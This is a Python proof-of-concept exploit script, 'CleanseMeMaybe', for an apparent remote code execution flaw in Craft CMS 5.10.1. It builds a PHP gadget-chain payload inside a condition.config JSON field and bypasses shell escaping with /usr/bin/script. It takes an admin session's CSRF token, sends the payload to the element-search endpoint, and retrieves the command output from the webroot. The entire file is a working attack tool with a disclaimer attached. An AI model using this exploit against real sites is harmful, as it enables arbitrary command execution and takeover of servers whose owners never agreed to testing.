#!/usr/bin/env python3
"""
CleanseMeMaybe - Craft CMS 5.10.1 Condition Config RCE PoC
Hey, I just decoded config, and this is crazy, but here's my condition.config, execute me maybe?

For authorized security research only. Only test against systems you own or have permission to test.
"""

import argparse
import json
import re
import sys
import urllib.request
import urllib.error
import urllib.parse


def build_payload(command, output_path="/var/www/html/web/craft_poc_output.txt"):
    """
    Build the condition.config JSON payload.
    Uses /usr/bin/script because the gadget chain's shell_exec() goes through
    escapeshellcmd() which escapes shell metacharacters like >, |, ;
    """
    payload = {
        "elementType": "craft\\elements\\Category",
        "fieldLayouts": [
            {
                "as rce": {
                    "__class": "yii\\behaviors\\AttributeTypecastBehavior",
                    "__construct()": [
                        {
                            "attributeTypes": {
                                "typecastBeforeSave": [
                                    "Psy\\Readline\\Hoa\\ConsoleProcessus",
                                    "execute"
                                ]
                            },
                            "typecastBeforeSave": f"/usr/bin/script -q -c {command} {output_path}"
                        }
                    ]
                },
                "on *": "self::beforeSave"
            }
        ]
    }
    return json.dumps(payload)


def build_canary_payload():
    """Build a non-executing canary to verify the cleanse bypass without RCE."""
    payload = {
        "elementType": "craft\\elements\\Category",
        "fieldLayouts": [
            {
                "as cleanseBypassCanary": {
                    "class": "NoSuch\\CanaryBehavior"
                }
            }
        ]
    }
    return json.dumps(payload)


def get_csrf_token(base_url, cookies):
    """Extract csrfTokenValue from the admin dashboard."""
    url = base_url.rstrip("/") + "/admin/dashboard"
    req = urllib.request.Request(url, headers={"Cookie": cookies})
    try:
        resp = urllib.request.urlopen(req, timeout=15)
        body = resp.read().decode("utf-8", errors="replace")
        match = re.search(r'csrfTokenValue\s*:\s*["\']([^"\']+)["\']', body)
        if match:
            return match.group(1)
        else:
            print("[!] Could not find csrfTokenValue in dashboard response")
            print("[!] Make sure your cookies are valid and you're authenticated")
            return None
    except urllib.error.HTTPError as e:
        print(f"[!] Dashboard request failed: HTTP {e.code}")
        return None


def send_trigger(base_url, cookies, csrf_token, payload_json, element_type="craft\\elements\\Category"):
    """Send the RCE trigger request."""
    url = base_url.rstrip("/") + "/admin/actions/element-search/search"

    body = json.dumps({
        "elementType": element_type,
        "siteId": 1,
        "search": "",
        "condition": {
            "class": "craft\\elements\\conditions\\ElementCondition",
            "config": payload_json
        }
    })

    req = urllib.request.Request(url, data=body.encode(), headers={
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-CSRF-Token": csrf_token,
        "Cookie": cookies,
    })

    try:
        resp = urllib.request.urlopen(req, timeout=15)
        data = resp.read().decode("utf-8", errors="replace")
        return resp.status, data
    except urllib.error.HTTPError as e:
        body_r = e.read().decode("utf-8", errors="replace")
        return e.code, body_r


def verify_output(base_url, cookies, verify_path="/craft_poc_output.txt"):
    """Retrieve the command output from the webroot."""
    url = base_url.rstrip("/") + verify_path
    req = urllib.request.Request(url, headers={"Cookie": cookies, "Accept": "text/plain, */*"})
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""


def main():
    parser = argparse.ArgumentParser(
        description="CleanseMeMaybe - Craft CMS 5.10.1 Condition Config RCE PoC",
        epilog="For authorized security research only."
    )
    parser.add_argument("--url", required=True, help="Base URL of Craft CMS (e.g. https://craft.example.com)")
    parser.add_argument("--cookie", required=True, help="Full Cookie header value")
    parser.add_argument("--cmd", default="id", help="Command to execute (default: id)")
    parser.add_argument("--output-path", default="/var/www/html/web/craft_poc_output.txt",
                        help="Server-side path for command output")
    parser.add_argument("--verify-path", default="/craft_poc_output.txt",
                        help="Web path to retrieve command output")
    parser.add_argument("--canary", action="store_true",
                        help="Send non-executing canary to test cleanse bypass without RCE")
    parser.add_argument("--csrf", default=None, help="CSRF token (auto-extracted if not provided)")

    args = parser.parse_args()

    print("╔══════════════════════════════════════════════════════╗")
    print("║          CleanseMeMaybe                             ║")
    print("║  Craft CMS 5.10.1 condition.config RCE PoC          ║")
    print("║  \"Hey I just decoded config, and this is crazy\"     ║")
    print("╚══════════════════════════════════════════════════════╝")
    print()

    # Get CSRF token
    if args.csrf:
        csrf_token = args.csrf
        print(f"[*] Using provided CSRF token: {csrf_token[:20]}...")
    else:
        print(f"[*] Extracting CSRF token from {args.url}/admin/dashboard ...")
        csrf_token = get_csrf_token(args.url, args.cookie)
        if not csrf_token:
            print("[!] Failed to get CSRF token. Exiting.")
            sys.exit(1)
        print(f"[+] CSRF token: {csrf_token[:20]}...")

    # Build payload
    if args.canary:
        print("[*] Building canary payload (no execution)...")
        payload = build_canary_payload()
    else:
        print(f"[*] Building RCE payload for command: {args.cmd}")
        payload = build_payload(args.cmd, args.output_path)

    # Send trigger
    print(f"[*] Sending trigger to {args.url}/admin/actions/element-search/search ...")
    status, body = send_trigger(args.url, args.cookie, csrf_token, payload)
    print(f"[*] Response: HTTP {status}")

    if status == 200:
        try:
            j = json.loads(body)
            print(f"    elements: {j.get('elements', 'N/A')}")
            print(f"    exactMatch: {j.get('exactMatch', 'N/A')}")
        except:
            print(f"    body: {body[:200]}")
    elif status == 400:
        print("[!] HTTP 400 - CSRF token likely invalid or expired")
        print("[!] Make sure to use csrfTokenValue from dashboard body, not CRAFT_CSRF_TOKEN cookie")
    elif status == 403:
        print("[!] HTTP 403 - Not authenticated or insufficient permissions")

    # Verify output
    if not args.canary:
        print(f"\n[*] Checking output at {args.url}{args.verify_path} ...")
        v_status, v_body = verify_output(args.url, args.cookie, args.verify_path)
        if v_status == 200 and v_body.strip():
            print(f"[+] COMMAND OUTPUT:")
            print(f"{'─'*50}")
            print(v_body.strip())
            print(f"{'─'*50}")
        else:
            print(f"[*] Verify returned HTTP {v_status}")
            print("[*] Command may not have executed, or output path differs")

    print("\n[*] Done")


if __name__ == "__main__":
    main()
